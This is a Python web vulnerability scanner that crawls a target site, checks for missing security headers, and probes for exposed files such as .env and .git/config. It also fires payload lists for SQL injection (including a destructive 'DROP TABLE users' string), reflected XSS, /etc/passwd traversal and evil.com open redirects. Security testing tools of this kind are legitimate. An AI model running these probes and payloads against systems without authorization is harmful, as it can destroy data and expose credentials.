#!/usr/bin/env python3
"""
Web Application Vulnerability Scanner
Identifies common vulnerabilities: SQL Injection, XSS, open redirects,
missing security headers, directory traversal, and sensitive file exposure.

Dependencies: pip install requests beautifulsoup4
"""

import argparse
import sys
import time
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("[ERROR] Missing dependencies. Run: pip install requests beautifulsoup4")
    sys.exit(1)

requests.packages.urllib3.disable_warnings()

# ──────────────────────────────────────────────
# Payloads
# ──────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR '1'='1' --",
    "\" OR \"1\"=\"1", "1; DROP TABLE users--",
    "' UNION SELECT NULL--", "admin'--",
]

SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-01756", "sqlite3",
    "pg_query", "syntax error", "unclosed quotation",
    "microsoft ole db", "odbc drivers", "you have an error in your sql",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "';alert('XSS');//",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
]

TRAVERSAL_PAYLOADS = [
    "../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "....//....//etc/passwd",
]

TRAVERSAL_SIGNATURES = ["root:x:", "bin:x:", "daemon:x:"]

SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/config.php", "/wp-config.php",
    "/phpinfo.php", "/admin", "/admin/", "/backup.sql",
    "/db.sqlite3", "/.htaccess", "/server-status",
    "/robots.txt", "/sitemap.xml", "/.DS_Store",
]

SECURITY_HEADERS = [
    "X-Frame-Options",
    "X-Content-Type-Options",
    "Content-Security-Policy",
    "Strict-Transport-Security",
    "Referrer-Policy",
    "Permissions-Policy",
]

OPEN_REDIRECT_PAYLOADS = [
    "https://evil.com",
    "//evil.com",
    "/\\evil.com",
]

# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────

class Finding:
    def __init__(self, severity, vuln_type, url, detail):
        self.severity = severity   # CRITICAL / HIGH / MEDIUM / LOW / INFO
        self.vuln_type = vuln_type
        self.url = url
        self.detail = detail

    def __str__(self):
        return f"  [{self.severity}] {self.vuln_type}\n    URL    : {self.url}\n    Detail : {self.detail}"


class Scanner:
    def __init__(self, target: str, delay: float = 0.3, timeout: int = 10, verbose: bool = False):
        self.target = target.rstrip("/")
        self.delay = delay
        self.timeout = timeout
        self.verbose = verbose
        self.findings: list[Finding] = []
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "VulnScanner/1.0 (Educational Security Tool)"
        })
        self.visited_forms = set()

    def log(self, msg):
        if self.verbose:
            print(f"    → {msg}")

    def get(self, url, params=None):
        try:
            r = self.session.get(url, params=params, timeout=self.timeout, verify=False, allow_redirects=True)
            time.sleep(self.delay)
            return r
        except requests.RequestException as e:
            self.log(f"GET failed: {e}")
            return None

    def post(self, url, data):
        try:
            r = self.session.post(url, data=data, timeout=self.timeout, verify=False, allow_redirects=True)
            time.sleep(self.delay)
            return r
        except requests.RequestException as e:
            self.log(f"POST failed: {e}")
            return None

    def add(self, severity, vuln_type, url, detail):
        f = Finding(severity, vuln_type, url, detail)
        self.findings.append(f)
        print(f"  ⚠  [{severity}] {vuln_type} — {detail[:80]}")

    # ──────────────────────────────────────────
    # 1. Security Headers
    # ──────────────────────────────────────────
    def check_security_headers(self):
        print("\n[*] Checking security headers...")
        r = self.get(self.target)
        if not r:
            return
        for header in SECURITY_HEADERS:
            if header.lower() not in {k.lower() for k in r.headers}:
                self.add("MEDIUM", "Missing Security Header", self.target, f"Header '{header}' is absent")
            else:
                self.log(f"{header}: present")

    # ──────────────────────────────────────────
    # 2. Sensitive Files / Paths
    # ──────────────────────────────────────────
    def check_sensitive_paths(self):
        print("\n[*] Probing sensitive paths...")
        for path in SENSITIVE_PATHS:
            url = self.target + path
            r = self.get(url)
            if r and r.status_code == 200:
                severity = "HIGH" if any(x in path for x in [".env", "config", "backup", "sqlite"]) else "INFO"
                self.add(severity, "Sensitive File Exposed", url, f"HTTP 200 on {path}")

    # ──────────────────────────────────────────
    # 3. Crawl & collect forms + query params
    # ──────────────────────────────────────────
    def crawl(self):
        print("\n[*] Crawling target for forms and links...")
        r = self.get(self.target)
        if not r:
            return [], []

        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")
        links = [a.get("href") for a in soup.find_all("a", href=True)]
        links = [urljoin(self.target, l) for l in links if urlparse(urljoin(self.target, l)).netloc == urlparse(self.target).netloc]
        print(f"    Found {len(forms)} form(s), {len(links)} internal link(s).")
        return forms, links

    # ──────────────────────────────────────────
    # 4. SQL Injection
    # ──────────────────────────────────────────
    def check_sqli_form(self, form, base_url):
        action = urljoin(base_url, form.get("action") or "")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        fields = {i.get("name", f"field{idx}"): i.get("value", "test") for idx, i in enumerate(inputs) if i.get("type") != "submit"}

        for payload in SQLI_PAYLOADS:
            data = {k: payload for k in fields}
            r = self.post(action, data) if method == "post" else self.get(action, params=data)
            if r and any(err in r.text.lower() for err in SQLI_ERRORS):
                self.add("CRITICAL", "SQL Injection", action, f"Error-based SQLi via payload: {payload[:40]}")
                return  # one finding per form is enough

    def check_sqli_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            for payload in SQLI_PAYLOADS:
                new_params = {k: v[0] for k, v in params.items()}
                new_params[param] = payload
                new_query = urlencode(new_params)
                test_url = urlunparse(parsed._replace(query=new_query))
                r = self.get(test_url)
                if r and any(err in r.text.lower() for err in SQLI_ERRORS):
                    self.add("CRITICAL", "SQL Injection", test_url, f"Error-based SQLi in param '{param}'")
                    break

    # ──────────────────────────────────────────
    # 5. Cross-Site Scripting (XSS)
    # ──────────────────────────────────────────
    def check_xss_form(self, form, base_url):
        action = urljoin(base_url, form.get("action") or "")
        method = form.get("method", "get").lower()
        inputs = form.find_all("input")
        fields = {i.get("name", f"field{idx}"): i.get("value", "test") for idx, i in enumerate(inputs) if i.get("type") != "submit"}

        for payload in XSS_PAYLOADS:
            data = {k: payload for k in fields}
            r = self.post(action, data) if method == "post" else self.get(action, params=data)
            if r and payload in r.text:
                self.add("HIGH", "Reflected XSS", action, f"Payload reflected: {payload[:50]}")
                return

    def check_xss_url(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
        for param in params:
            for payload in XSS_PAYLOADS:
                new_params = {k: v[0] for k, v in params.items()}
                new_params[param] = payload
                new_query = urlencode(new_params)
                test_url = urlunparse(parsed._replace(query=new_query))
                r = self.get(test_url)
                if r and payload in r.text:
                    self.add("HIGH", "Reflected XSS", test_url, f"Payload reflected in param '{param}'")
                    break

    # ──────────────────────────────────────────
    # 6. Directory Traversal
    # ──────────────────────────────────────────
    def check_traversal(self, links):
        print("\n[*] Testing directory traversal...")
        traversal_urls = [l for l in links if "=" in l]
        for url in traversal_urls[:5]:  # limit scope
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                for payload in TRAVERSAL_PAYLOADS:
                    new_params = {k: v[0] for k, v in params.items()}
                    new_params[param] = payload
                    test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                    r = self.get(test_url)
                    if r and any(sig in r.text for sig in TRAVERSAL_SIGNATURES):
                        self.add("CRITICAL", "Directory Traversal", test_url, f"Possible /etc/passwd read via param '{param}'")
                        return

    # ──────────────────────────────────────────
    # 7. Open Redirect
    # ──────────────────────────────────────────
    def check_open_redirect(self, links):
        print("\n[*] Testing open redirects...")
        redirect_params = ["url", "redirect", "next", "return", "to", "goto", "dest"]
        for url in links:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            for param in params:
                if param.lower() in redirect_params:
                    for payload in OPEN_REDIRECT_PAYLOADS:
                        new_params = {k: v[0] for k, v in params.items()}
                        new_params[param] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(new_params)))
                        r = self.get(test_url)
                        if r and "evil.com" in r.url:
                            self.add("HIGH", "Open Redirect", test_url, f"Redirected to payload via param '{param}'")

    # ──────────────────────────────────────────
    # Run all checks
    # ──────────────────────────────────────────
    def run(self):
        print(f"\n{'='*60}")
        print(f"  WEB VULNERABILITY SCANNER")
        print(f"  Target : {self.target}")
        print(f"{'='*60}")

        self.check_security_headers()
        self.check_sensitive_paths()

        forms, links = self.crawl()

        if forms:
            print(f"\n[*] Testing {len(forms)} form(s) for SQLi and XSS...")
            for form in forms:
                key = str(form)
                if key in self.visited_forms:
                    continue
                self.visited_forms.add(key)
                self.check_sqli_form(form, self.target)
                self.check_xss_form(form, self.target)

        if links:
            print(f"\n[*] Testing {len(links)} URL(s) for SQLi and XSS...")
            for link in links:
                self.check_sqli_url(link)
                self.check_xss_url(link)
            self.check_traversal(links)
            self.check_open_redirect(links)

        self.report()

    # ──────────────────────────────────────────
    # Report
    # ──────────────────────────────────────────
    def report(self):
        print(f"\n{'='*60}")
        print("  SCAN COMPLETE — FINDINGS SUMMARY")
        print(f"{'='*60}")

        if not self.findings:
            print("  ✔ No vulnerabilities detected.\n")
            return

        order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
        sorted_findings = sorted(self.findings, key=lambda f: order.get(f.severity, 5))

        counts = {}
        for f in sorted_findings:
            counts[f.severity] = counts.get(f.severity, 0) + 1
            print(f"\n{f}")

        print(f"\n{'─'*60}")
        print("  Totals:")
        for sev, count in sorted(counts.items(), key=lambda x: order.get(x[0], 5)):
            print(f"    {sev:<10}: {count}")
        print(f"{'─'*60}\n")


# ──────────────────────────────────────────────
# Entry point
# ──────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Web Application Vulnerability Scanner (Educational Use Only)"
    )
    parser.add_argument("url", help="Target URL (e.g. http://testphp.vulnweb.com)")
    parser.add_argument("--delay", type=float, default=0.3, help="Delay between requests in seconds (default: 0.3)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--verbose", action="store_true", help="Show detailed request logs")
    args = parser.parse_args()

    if not args.url.startswith(("http://", "https://")):
        print("[ERROR] URL must start with http:// or https://")
        sys.exit(1)

    print("\n  ⚠  WARNING: Only scan applications you own or have explicit permission to test.")

    scanner = Scanner(args.url, delay=args.delay, timeout=args.timeout, verbose=args.verbose)
    scanner.run()


if __name__ == "__main__":
    main()
